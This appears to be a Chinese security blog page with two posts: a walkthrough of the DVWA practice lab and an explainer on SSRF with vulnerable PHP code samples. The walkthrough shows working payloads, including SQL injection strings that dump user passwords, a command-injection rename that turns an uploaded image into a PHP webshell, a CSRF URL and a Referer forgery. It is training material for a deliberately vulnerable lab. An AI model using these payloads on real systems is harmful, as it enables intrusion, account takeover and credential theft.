<p><img src="/.com//9275c6eed4da2dc9b0c7c1e5e63d563c-20250425170542-d99goej.png" alt="9275c6eed4da2dc9b0c7c1e5e63d563c"></p>
<p>‍</p>
<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><p> 源码分析：发现还是一样的套路，也是过滤字符但过滤得更多了。但仔细观察发现有一个过滤是’| ‘，注意这个过滤是加了空格的，说明这个过滤其实是没用的，只需要’|’后面直接加入参数，不保留空格，我们依然可以用这个命令连接符进行命令注入</p>
<p><img src="/.com//a24bd3a257d4e129cca8019070a9b07d-20250425170620-rfpguy9.png" alt="a24bd3a257d4e129cca8019070a9b07d"></p>
<p>‍</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><p> 网站的本意是让我们在网站里更改密码</p>
<p><img src="/.com//1939fdc85c82e1df86c9b1f916522081-20250425171126-xu4wwp5.png" alt="1939fdc85c82e1df86c9b1f916522081"></p>
<blockquote>
<p>但是能够主要到当我们更改密码成功后url栏的参数是这样的<br><a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a><br>可以分析出password_new是我输入的密码，password_conf是我确认的密码，说明我们在网站上输入的信息是会在url栏这里进行一个传输执行</p>
</blockquote>
<p><img src="/.com//830adffb3898c5c5488d85ee81e8e6a9-20250425171137-dr9bhdv.png" alt="830adffb3898c5c5488d85ee81e8e6a9"></p>
<p>抓个包看看，发现url栏的信息和请求的信息是一致的</p>
<p> <img src="/.com//de160531a83b91e4ff84d165b7a7c13a-20250425171147-iksxt52.png" alt="de160531a83b91e4ff84d165b7a7c13a"></p>
<blockquote>
<p>那是不是说明如果我能控制url栏里传入的参数，就能够不在网站内执行更改密码的操作呢？<br>更改url的参数：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=456789&password_conf=456789&Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=456789&amp;password_conf=456789&amp;Change=Change#</a><br>只需要在原来的url基础上该新密码和确认密码的参数即可</p>
<p>为了显示效果，我使当前页面是密码不匹配状态</p>
</blockquote>
<p><img src="/.com//c170717135b963832851ab18cdd7291e-20250425171200-nuulqr6.png" alt="c170717135b963832851ab18cdd7291e"></p>
<p>在新标签内放入设置好的url，点击执行</p>
<p><img src="/.com//5c64252299acea56a3b35687d997aeb0-20250425171207-xr9kfct.png" alt="5c64252299acea56a3b35687d997aeb0"></p>
<p>页面跳转到了dvwa的更改密码界面，csrf攻击成功</p>
<p><img src="/.com//2ada0b8e5e0e9bc04452aa3935526506-20250425171213-9w5xvbr.png" alt="2ada0b8e5e0e9bc04452aa3935526506"></p>
<blockquote>
<p>网站的本意是在网站内更改密码，而我通过控制url的传参就能使我能在网站之外执行更改密码的操作，那么当我知道一个网站有csrf漏洞后也可以通过构造url的方式让别人点击执行他意想之外的行为</p>
<p>源码分析：源码中只对传入的密码和确认密码进行比较，两者一致则执行更改密码命令成功返回Password Change，不一致则返回Passwords did not match，没有任何过滤，所以能轻易执行csrf漏洞</p>
</blockquote>
<p><img src="/.com//f0c609415b16d644263608771e005b1a-20250425171252-o8j4acs.png" alt="f0c609415b16d644263608771e005b1a"></p>
<p>‍</p>
<h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><p> 源码分析：和Low等级比较发现，只有一处改变，即在传入密码和确认密码参数前先进行了一个&#x3D;&#x3D;if语句的判断&#x3D;&#x3D;，判断里面的内容主要是验证这个访问请求是否是从&#x3D;&#x3D;dwva网站&#x3D;&#x3D;本身发起的，若不是就不执行后面的操作</p>
<p><img src="/.com//9dbaa6761aa3ad43ade255e9fe296b30-20250425171315-yfcd81j.png" alt="9dbaa6761aa3ad43ade255e9fe296b30"></p>
<p>源码是通过referrer这个字段的参数进行判断的，通常情况下在增加referrer验证时就是网站本身当前页面的ip地址，我们通过抓包看看信息</p>
<p>首先抓一个包，可以看到这里有referer</p>
<p><img src="/.com//9cea6507c937a1c9f35fd8b63940524c-20250425171659-wyha15h.png" alt="9cea6507c937a1c9f35fd8b63940524c"></p>
<p>复制刚才构造好的url，在新页面打开：<a target="_blank" rel="noopener" href="http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&password_conf=666666&Change=Change#" title="http:&#x2F;&#x2F;192.168.10.5&#x2F;DVWA&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;666666&amp;password_conf&#x3D;666666&amp;Change&#x3D;Change#">http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new&#x3D;666666&amp;password_conf&#x3D;666666&amp;Change&#x3D;Change#</a></p>
<p>抓包，发现没有referer</p>
<p><img src="/.com//3d4b2706cc958a8f1394de205839b040-20250425171716-w1cnaaw.png" alt="3d4b2706cc958a8f1394de205839b040"></p>
<p>我们自己在这里加一个referer，随意添加，包含本机就可以例如：127.0.0.1</p>
<p><img src="/.com//ab872067c571ccab991bbebbbe9c311d-20250425171723-miwfpva.png" alt="ab872067c571ccab991bbebbbe9c311d"></p>
<p>放包，发现已经成功修改</p>
<p>‍</p>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p> 可以看到，设置了token</p>
<p> 这里我们采用抓包，把包发到重放模块，在row中可以看到新的token</p>
<p><img src="/.com//4eb20c2a54b3919e475b47dfde22f4ff-20250425171734-p8nrrqi.png" alt="4eb20c2a54b3919e475b47dfde22f4ff"></p>
<blockquote>
<p>接下来使用获取到的新token构造链接</p>
<p><a target="_blank" rel="noopener" href="http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&password_conf=666666&Change=Change&user_token=9c36edfc71b135e726adce6603be8651">http://192.168.10.5/DVWA/vulnerabilities/csrf/?password_new=666666&amp;password_conf=666666&amp;Change=Change&amp;user_token=9c36edfc71b135e726adce6603be8651</a></p>
<p>修改成功</p>
</blockquote>
<p>‍</p>
<h2 id="4-File-inclusion-文件包含"><a href="#4-File-inclusion-文件包含" class="headerlink" title="4.File inclusion 文件包含"></a>4.File inclusion 文件包含</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p> 每次点击都会跳转，所以可以在page=后面添加本地文件路径</p>
<p><img src="/.com//7386fd3fd2979574a11e49bbf188337a-20250425172020-tcersi4.png" alt="7386fd3fd2979574a11e49bbf188337a"></p>
<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p> 可以通过ip+路径包含文件</p>
<p><img src="/.com//d28bea7da6e424606062dfb78c2893e1-20250425172030-4kgs98a.png" alt="d28bea7da6e424606062dfb78c2893e1"></p>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p><img src="/.com//ea03f7407dc9279a2ed7d860673023f0-20250425172036-kxf2wi3.png" alt="ea03f7407dc9279a2ed7d860673023f0"></p>
<p>源码限制了page之后的参数是以file开头，所以可以用file函数去构建</p>
<p> <a target="_blank" rel="noopener" href="http://192.168.10.5/DVWA/vulnerabilities/fi/?page=file://E:%5CphpStudy%5CWWW%5CDVWA%5Cfile555.txt" title="http:&#x2F;&#x2F;192.168.10.5&#x2F;DVWA&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;E:\phpStudy\WWW\DVWA\file555.txt">http://192.168.10.5/DVWA/vulnerabilities/fi/?page=file://E:\phpStudy\WWW\DVWA\file555.txt</a></p>
<p><img src="/.com//b94534da3ee8d55a722bd51d644994e6-20250425172043-5fapvh7.png" alt="b94534da3ee8d55a722bd51d644994e6"></p>
<p>‍</p>
<h2 id="5-File-upload文件上传"><a href="#5-File-upload文件上传" class="headerlink" title="5.File upload文件上传"></a>5.File upload文件上传</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><p><img src="/.com//c92f0ca2659de359b6dda9fdd58d23cd-20250425172053-9ya348y.png" alt="c92f0ca2659de359b6dda9fdd58d23cd"></p>
<p>可以看到，没有任何限制，所以直接上传一个php后门文件即可</p>
<p> 直接上传一句话木马，蚁剑链接即可</p>
<h3 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h3><p> 可以看到，靶场对文件类型做了限制，只允许上传png、jpeg，并且检查</p>
<p><img src="/.com//fd8bc231d15557db234ddd92e2d4a745-20250425172423-br5ll4y.png" alt="fd8bc231d15557db234ddd92e2d4a745"></p>
<p>burp后台改后缀即可</p>
<p>‍</p>
<h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><p> 看源代码可以发现，不仅限制了文件类型，而且限制了大小，不能少于100kb</p>
<p><img src="/.com//42a6ceb6367ab31ef8b9468d9d5c45fb-20250425172446-hhvsnf6.png" alt="42a6ceb6367ab31ef8b9468d9d5c45fb"></p>
<p>可以上传一个图片马，打开cmd，输入以下命令：<code>copy post2.php/a + 111.png/b 66.png</code>​</p>
<p><img src="/.com//549490ef5de7cd680ca26bd8f524f483-20250425172455-32a0xdu.png" alt="549490ef5de7cd680ca26bd8f524f483"></p>
<p>此时已经上传成功，但不能利用</p>
<p><img src="/.com//4a84d8fcccf0c77b894d775b47aa45cd-20250425172506-52ttghn.png" alt="4a84d8fcccf0c77b894d775b47aa45cd"></p>
<p>在命令注入中输入127.0.0.1|| ren C:\phpstudy_pro\WWW\DVWA-master\hackable\uploads\888.png 888.php</p>
<p><img src="/.com//ccfc7557d167997fdc4dd98f505a1078-20250425172532-dnkw477.png" alt="ccfc7557d167997fdc4dd98f505a1078">此时发现，888.png已经被改名为888.php</p>
<p>‍</p>
<h2 id="6-insecure-captcha不安全的验证"><a href="#6-insecure-captcha不安全的验证" class="headerlink" title="6.insecure captcha不安全的验证"></a>6.insecure captcha不安全的验证</h2><h3 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h3><p> 本关是在第二步做验证，所以把step改为2就可以绕过验证</p>
<p><img src="/.com//eabf443fe5d55d6af0739e5c7df2e765-20250425172652-x0th1hw.png" alt="eabf443fe5d55d6af0739e5c7df2e765"></p>
<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p> 依旧抓包改包</p>
<p><img src="/.com//3635ebcbdcf767c961b46cda65863f80-20250425172657-5hierei.png" alt="3635ebcbdcf767c961b46cda65863f80"></p>
<h3 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h3><p><img src="/.com//490a93c21a9bd427fe3d29dea67d7efa-20250425172703-77m3kop.png" alt="490a93c21a9bd427fe3d29dea67d7efa"></p>
<p>让通过验证的情况增加了一种。原先是只有验证码为真才能通过验证，现在新增“或者g-recaptcha-response且HTTP_USER_AGENT为特定内容”通过验证。</p>
<p> 那直接用Burpsuite修改数据包</p>
<p><img src="/.com//8601e5ee714e65e6521aaecea77fbe2d-20250425172708-5gq4swo.png" alt="8601e5ee714e65e6521aaecea77fbe2d"></p>
<p>‍</p>
<h2 id="7-SQL-injection-sql注入"><a href="#7-SQL-injection-sql注入" class="headerlink" title="7.SQL injection sql注入"></a>7.SQL injection sql注入</h2><h3 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h3><ol>
<li>输入1+2，可以看到，并未输出3，所以可以判定是字符型注入</li>
</ol>
<p><img src="/.com//91a5a615ee0f8c4b9199dd8788cb79e2-20250425172821-gb4jvax.png" alt="91a5a615ee0f8c4b9199dd8788cb79e2"></p>
<p>输入如下payload：’1 or 1=1’ ，可以看到有报错，所以一定存在sql注入</p>
<p><img src="/.com//0ded62d0731c2502d756236e702834a6-20250425172828-2scjktq.png" alt="0ded62d0731c2502d756236e702834a6"></p>
<p><img src="/.com//4fd521db8e735523d0a818882dce5597-20250425172831-e9o5jfm.png" alt="4fd521db8e735523d0a818882dce5597"></p>
<p>使用order by判断字段数 1’ order by 2 #</p>
<p><img src="/.com//a17effc3868eb93c474867f504fe2e02-20250425172838-0nbohx7.png" alt="a17effc3868eb93c474867f504fe2e02"></p>
<p>1’ order by 3 #</p>
<p><img src="/.com//3200280212d7dbbf9417cd5f46a177ce-20250425172844-yv8r8qc.png" alt="3200280212d7dbbf9417cd5f46a177ce"></p>
<p>由此判断，他只有两个字段</p>
<ol>
<li>然后使用联合查询 1’ union select 1,2 # 获取回显位置</li>
</ol>
<p><img src="/.com//14b5a5a1f63d114e0c22f9649147a3fd-20250425172850-1pa3jj7.png" alt="14b5a5a1f63d114e0c22f9649147a3fd"></p>
<p>在对应位置获取数据库名 1’ union select database(),2 #</p>
<p><img src="/.com//5c64dd66f4fed0355fd501f7ce4768e7-20250425172856-izm3bma.png" alt="5c64dd66f4fed0355fd501f7ce4768e7"></p>
<p>获取数据库所有表名 1’ union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #</p>
<p><img src="/.com//60b5183c063b38ef89a35c0f06b11302-20250425172901-19j6jn0.png" alt="60b5183c063b38ef89a35c0f06b11302"></p>
<pre><code>获取users字段名
</code></pre>
<p>1’ union select group_concat(column_name),2 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() #</p>
<p><img src="/.com//9b28bb76146997ac3c1a0310c70c0290-20250425172911-y5kdd7j.png" alt="9b28bb76146997ac3c1a0310c70c0290"></p>
<ol>
<li>获取字段值</li>
</ol>
<p> 1’ union select password,user from users #</p>
<p><img src="/.com//830ea6ebdea4a1cafbd68c3b1fc28c7d-20250425172925-6nzb1g3.png" alt="830ea6ebdea4a1cafbd68c3b1fc28c7d"></p>
<p>现在已经拿到了用户和密码，但密码是加密的，可使用md5自行解密 <a target="_blank" rel="noopener" href="https://cmd5.com/" title="md5在线解密破解,md5解密加密">md5在线解密破解,md5解密加密</a></p>
<p>‍</p>
<h3 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h3><ol>
<li>先选中1，抓一个包，然后发到重放模块，用于测试，可以修改参数，数字型注入</li>
</ol>
<p> id修改为1+1，出现报错</p>
<p><img src="/.com//f290b11a4a46c412831d62057faa65c5-20250425173006-w7azyem.png" alt="f290b11a4a46c412831d62057faa65c5"></p>
<p>使用order by判断字段数</p>
<p><img src="/.com//f7080fe5b14c527ac83e957fa6f387af-20250425173025-p1mqx8c.png" alt="f7080fe5b14c527ac83e957fa6f387af"></p>
<p><img src="/.com//7e576d86d507cb5fda0d514b7f339a7c-20250425173028-dvfygd6.png" alt="7e576d86d507cb5fda0d514b7f339a7c"></p>
<p>输入联合查询语句</p>
<p><img src="/.com//94c752d33768607b940ba5c088b8454c-20250425173035-pg461k1.png" alt="94c752d33768607b940ba5c088b8454c"></p>
<p>剩余步骤同上</p>
<h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><p> 1.输入1’，发现报错</p>
<p><img src="/.com//c3e7ddd980a483947e4df2376ac0d2ff-20250425173042-zcr3d58.png" alt="c3e7ddd980a483947e4df2376ac0d2ff"></p>
<p>输入联合查询语句</p>
<p><img src="/.com//1bfc929320387d76beafeb6597f52f71-20250425173052-250wxuk.png" alt="1bfc929320387d76beafeb6597f52f71"></p>
<p>按上述步骤进行查询</p>
<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><p> 限制只能为数字   不存在注入</p>
<p>‍</p>
<h2 id="8-SQL-injection（blind）盲注"><a href="#8-SQL-injection（blind）盲注" class="headerlink" title="8.SQL injection（blind）盲注"></a>8.SQL injection（blind）盲注</h2><h3 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h3><ol>
<li>输入 1’ and 1=1 # 可以看到 正常执行</li>
</ol>
<p><img src="/.com//34337217f9b95502cde5e73d522aba79-20250425173105-dwfpfwp.png" alt="34337217f9b95502cde5e73d522aba79"></p>
<p>猜解开数据库长度1’ and length(database())=x #</p>
<p><img src="/.com//751149ca4a1557d6985de8d258d2cf01-20250425173119-c3wcxww.png" alt="751149ca4a1557d6985de8d258d2cf01"></p>
<p><img src="/.com//4b90b927976bd2e18252b41bdb1b5f48-20250425173123-ffmyd3b.png" alt="4b90b927976bd2e18252b41bdb1b5f48"></p>
<p>用aascii猜解数据库名 1’ and ascii(substr(database(),1,1))=100 # 由此确定，第一位ascii是100，对比ascii表（<a target="_blank" rel="noopener" href="http://ascii.wjccx.com/" title="ASCII码对照表-完整ASCII码表-我就查查询">ASCII码对照表-完整ASCII码表-我就查查询</a>）可得 为d</p>
<p><img src="/.com//43b0bc8b8ca471ba0126fe4f5f6a2a0e-20250425173156-3qawi2b.png" alt="43b0bc8b8ca471ba0126fe4f5f6a2a0e"></p>
<ol>
<li>和普通sql注入相同，依次查询库名表名字段名</li>
</ol>
<h3 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h3><ol>
<li>随意选择一个数，然后抓包</li>
</ol>
<p><img src="/.com//7ac45f64d1403222c82393a5b210906c-20250425173331-kchwbjb.png" alt="7ac45f64d1403222c82393a5b210906c"></p>
<p>修改参数 1 and length(database())=4 #，根据布尔 盲注判断，，数据库名为4</p>
<p><img src="/.com//a4553a678f1d6482e5fb8ce9841c3538-20250425173338-wyz18se.png" alt="a4553a678f1d6482e5fb8ce9841c3538"></p>
<p>下面依旧使用sql语句进行查询，步骤同上</p>
<p>‍</p>
<h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><ol>
<li>1’ and 1=1 # 测试，发现成功执行</li>
</ol>
<p><img src="/.com//ca86f4d80df4b3feccbf28e4ccdaf857-20250425173346-utigrlz.png" alt="ca86f4d80df4b3feccbf28e4ccdaf857"></p>
<p>盲注，测试数据库名长度 1’ and length(database())=4 #</p>
<p><img src="/.com//31274efc2f2bde6b41b806798e997547-20250425173353-ae59gvt.png" alt="31274efc2f2bde6b41b806798e997547"></p>
<p>接下来的步骤同上</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" data-id="cmaxy8gbd0001kg7kdooe1byb" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/SSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/SSRF/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、SSRF是什么？"><a href="#一、SSRF是什么？" class="headerlink" title="一、SSRF是什么？"></a>一、SSRF是什么？</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<hr>
<h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</span></p>
<p><img src="/.com//image-20250520025641-k2sfyci.png" alt="image"></p>
<p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
<hr>
<h2 id="三、SSRF漏洞挖掘"><a href="#三、SSRF漏洞挖掘" class="headerlink" title="三、SSRF漏洞挖掘"></a>三、SSRF漏洞挖掘</h2><p>1、分享：通过URL地址分享网页内容</p>
<p><img src="/.com//image-20250520025700-u9pjgmi.png" alt="image"></p>
<p>2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p>
<p>3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p>
<p><img src="/.com//image-20250520025709-vdxc2ye.png" alt="image"></p>
<p>4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p>
</blockquote>
<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
<p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p>
<p><img src="/.com//image-20250520025722-dq5eksz.png" alt="image"></p>
<p>6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p>
<p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p>
<p>7、从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞</p>
<blockquote>
<p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p>
</blockquote>
<p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p>
<hr>
<h2 id="四、产生SSRF漏洞的函数"><a href="#四、产生SSRF漏洞的函数" class="headerlink" title="四、产生SSRF漏洞的函数"></a>四、产生SSRF漏洞的函数</h2><p>SSRF攻击可能存在任何语言编写的应用，接下来将举例&#x3D;&#x3D;php&#x3D;&#x3D;中可能存在SSRF漏洞的函数。</p>
<p><strong>1、file_get_contents:</strong></p>
<p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line">file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$img</span>; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>2、sockopen():</strong></p>
<p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">function</span> GetFile(<span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span>) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$errstr</span> (error number <span class="variable">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose(<span class="variable">$fp</span>); </span><br><span class="line"><span class="built_in">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>3、curl_exec():</strong></p>
<p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意事项</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">curl_exec() 默认不跟踪跳转，</span><br><span class="line">file_get_contents() file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="五、SSRF中URL的伪协议"><a href="#五、SSRF中URL的伪协议" class="headerlink" title="五、SSRF中URL的伪协议"></a>五、SSRF中URL的伪协议</h2><p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p>
